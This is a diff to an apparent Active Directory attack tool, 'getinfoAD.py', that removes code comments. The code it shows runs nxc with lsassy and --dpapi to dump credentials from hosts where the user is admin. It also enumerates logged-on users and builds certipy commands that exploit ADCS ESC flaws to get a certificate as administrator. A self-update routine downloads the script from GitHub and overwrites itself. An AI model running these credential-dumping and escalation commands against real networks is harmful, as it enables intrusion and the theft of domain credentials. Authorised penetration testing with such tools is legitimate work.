@@ -216,24 +216,20 @@ def perform_update():
         response = requests.get('https://raw.githubusercontent.com/Frozenka/GetInfoAD/main/getinfoAD.py')
         if response.status_code == 200:
             backup_path = f"{__file__}.backup"
-            # Create backup of current version
             shutil.copy2(__file__, backup_path)
             
             try:
-                # Write new version
                 with open(__file__, 'wb') as f:
                     f.write(response.content)
                 print(colored("✅ Update successful!", "green"))
                 print(colored("🔄 Restarting script...", "cyan"))
                 os.execv(sys.executable, ['python3'] + sys.argv)
             except Exception as e:
-                # Restore backup if update fails
                 shutil.copy2(backup_path, __file__)
                 print(colored(f"❌ Update failed, restored backup: {e}", "red"))
                 os.remove(backup_path)
                 return False
             
-            # Remove backup if update successful
             os.remove(backup_path)
             return True
     except Exception as e:
@@ -345,7 +341,6 @@ def show_domain_info(domain):
     padding = 62 - len(domain_line)
     print(colored("║", "cyan") + colored(domain_line, "yellow", attrs=["bold"]) + " " * padding + colored("║", "cyan"))
     print(colored("╚══════════════════════════════════════════════════════════════╝", "cyan"))
-    #print()
 
 
 def banner():
@@ -466,7 +461,6 @@ def get_machines(with_versions=False):
         print(colored("\n🔍 Scanning for machines...", "cyan"))
     
     for line in lines:
-        # Recherche du nom d'hôte et de l'IP
         hostname_match = re.search(r'SMB\s+(\d+\.\d+\.\d+\.\d+)\s+\d+\s+(\w+)', line)
         if hostname_match:
             ip = hostname_match.group(1)
@@ -481,7 +475,6 @@ def get_machines(with_versions=False):
                     print(colored("="*50 + "\n", "red"))
             
             if with_versions:
-                # Extraction de l'OS depuis la ligne SMB
                 os_match = re.search(r'\[\*\] (.*?) \(name:', line)
                 if os_match:
                     os_info = os_match.group(1).strip()
@@ -501,7 +494,6 @@ def get_machines(with_versions=False):
             
             admin_results[hostname] = {"ip": admin_ip, "lsassy": [], "dpapi": []}
             
-            # Exécuter lsassy
             print(colored("\n📊 Running LSASSY dump...", "yellow"))
             lsassy_command = f'''nxc smb {admin_ip} -u $USER -p $PASSWORD -M lsassy'''
             lsassy_results = run_command(lsassy_command)
@@ -516,7 +508,6 @@ def get_machines(with_versions=False):
             if not found_creds:
                 print(colored("  ℹ️  No credentials found with LSASSY", "yellow"))
             
-            # Exécuter dpapi
             print(colored("\n🔐 Running DPAPI check...", "yellow"))
             dpapi_command = f'''nxc smb {admin_ip} -u $USER -p $PASSWORD --dpapi'''
             dpapi_results = run_command(dpapi_command)
@@ -553,7 +544,6 @@ def get_loggedon_users():
     sessions = defaultdict(lambda: {"ip": "", "users": []})
     
     for line in lines:
-        # Amélioration de la détection des hôtes
         match_host = re.match(r'^SMB\s+(\S+)\s+\d+\s+(\S+)', line)
         if match_host:
             ip = match_host.group(1)
@@ -561,8 +551,6 @@ def get_loggedon_users():
             sessions[host]["ip"] = ip
             continue
             
-        # Amélioration de la détection des utilisateurs
-        # Cherche les patterns comme "DOMAIN\user" ou "user@domain"
         user_patterns = [
             r'(\\\\|\s)([\w.-]+\\[\w.-]+)\s+logon_server',  # DOMAIN\user
             r'([\w.-]+@[\w.-]+)\s+logon_server',  # user@domain
@@ -574,7 +562,6 @@ def get_loggedon_users():
             match_user = re.search(pattern, line)
             if match_user:
                 user = match_user.group(1) if "\\" in match_user.group(1) else match_user.group(2)
-                # Extraire le nom d'hôte de la ligne
                 host_match = re.search(r'SMB\s+\S+\s+\d+\s+(\S+)', line)
                 if host_match:
                     host = host_match.group(1)
@@ -582,7 +569,6 @@ def get_loggedon_users():
                     sessions[host]["users"].append(user)
                     break
     
-    # Si aucune session n'est trouvée, ajouter un message d'erreur
     if not sessions:
         print(colored("⚠️ No logged-on users found or access denied", "yellow"))
     
@@ -638,7 +624,6 @@ def get_domain_name():
     if dc_ip:
         os.environ["DC_IP"] = dc_ip
     else:
-        # Si on n'a pas trouvé le DC, on utilise l'IP fournie
         os.environ["DC_IP"] = os.getenv("IP")
         if DEBUG:
             print(colored(f"⚠️  No DC found, using provided IP: {os.getenv('IP')}", "yellow"))
@@ -901,7 +886,6 @@ def process_esc_vulnerabilities(adcs_info):
     current_ca = None
     current_template = None
     
-    # Special cases handling
     special_cases = {
         "ESC6": {
             "command": "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -web -upn administrator@{domain} -debug",
@@ -934,7 +918,6 @@ def process_esc_vulnerabilities(adcs_info):
         elif any(esc in line for esc in AUTOMATED_ESC_EXPLOITS.keys()):
             esc_num = line.split(":")[0].strip()
             if esc_num in AUTOMATED_ESC_EXPLOITS:
-                # Vérifier si c'est un cas spécial qui ne nécessite pas de template
                 if esc_num in special_cases:
                     detected_escs[esc_num] = {
                         "ca_name": current_ca,
@@ -942,7 +925,6 @@ def process_esc_vulnerabilities(adcs_info):
                         "special_case": True,
                         "exploit_info": special_cases[esc_num]
                     }
-                # Pour les autres cas, on ne les ajoute que si on a tous les paramètres requis
                 elif current_template and current_ca:
                     detected_escs[esc_num] = {
                         "ca_name": current_ca,
@@ -954,7 +936,6 @@ def process_esc_vulnerabilities(adcs_info):
     if detected_escs:
         print(colored("\n🔍 Detected ESC vulnerabilities that can be automatically exploited:", "cyan"))
         for esc_num, info in detected_escs.items():
-            # Vérifier si nous avons tous les paramètres requis
             params = {
                 "username": os.getenv("USER"),
                 "password": os.getenv("PASSWORD"),
@@ -967,7 +948,6 @@ def process_esc_vulnerabilities(adcs_info):
             requirements = info["exploit_info"]["requirements"]
             missing_params = [req for req in requirements if not params.get(req)]
             
-            # Ne proposer l'exploitation que si nous avons tous les paramètres requis
             if not missing_params:
                 print(colored(f"\n• {esc_num}", "yellow"))
                 print(f"  CA: {info['ca_name']}")
@@ -1050,7 +1030,6 @@ def get_adcs_info():
                             esc_num = esc_num.strip()
                             desc = desc.strip()
                             vulns.append(f"{esc_num}: {desc}")
-                            # Ajout des informations de Hacker Recipes
                             if esc_num in ESC_VULNERABILITIES:
                                 esc_info = ESC_VULNERABILITIES[esc_num]
                                 vulns.append(f"📖 Documentation: {esc_info['link']}")
@@ -1100,14 +1079,12 @@ def get_adcs_info():
                             esc_num = esc_num.strip()
                             desc = desc.strip()
                             vulns.append(f"{esc_num}: {desc}")
-                            # Ajout des informations de Hacker Recipes
                             if esc_num in ESC_VULNERABILITIES:
                                 esc_info = ESC_VULNERABILITIES[esc_num]
                                 vulns.append(f"📖 Documentation: {esc_info['link']}")
                                 vulns.append(f"💡 Exploitation: {esc_info['description']}")
             
         if vulns:
-            # Process detected vulnerabilities for potential exploitation
             process_esc_vulnerabilities(vulns)
         
         return vulns
